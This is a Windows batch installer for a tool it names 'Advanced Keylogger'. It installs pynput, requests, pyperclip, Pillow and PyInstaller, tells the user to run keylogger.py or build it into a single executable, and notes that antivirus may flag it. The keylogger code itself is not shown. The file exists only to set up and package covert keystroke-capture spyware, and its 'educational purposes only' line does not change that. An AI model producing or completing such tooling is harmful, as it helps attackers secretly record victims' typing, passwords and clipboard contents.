@echo off
echo Advanced Keylogger - Easy Installation
echo ------------------------------------
echo.

REM Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH.
    echo Please install Python from https://www.python.org/downloads/
    echo Make sure to check "Add Python to PATH" during installation.
    echo.
    pause
    exit /b 1
)

echo [1/2] Installing dependencies...
echo Upgrading pip and setuptools...
python -m pip install --upgrade pip setuptools wheel

echo Installing pre-compiled packages (this may take a few minutes)...
python -m pip install --only-binary :all: pynput requests pyperclip
echo Installing Pillow (latest version)...
python -m pip install --only-binary :all: Pillow
echo Installing PyInstaller...
python -m pip install --only-binary :all: pyinstaller

echo.
echo [2/2] Ready to run!
echo.
echo You can now run the keylogger with:
echo   python keylogger.py
echo.
echo To build an executable (optional):
echo   1. Try 'build.bat' 
echo   2. If that fails, you can run 'python -m PyInstaller --onefile keylogger.py'
echo.
echo Note: The keylogger might be flagged by antivirus software.
echo This tool is for educational purposes only.
echo.

pause 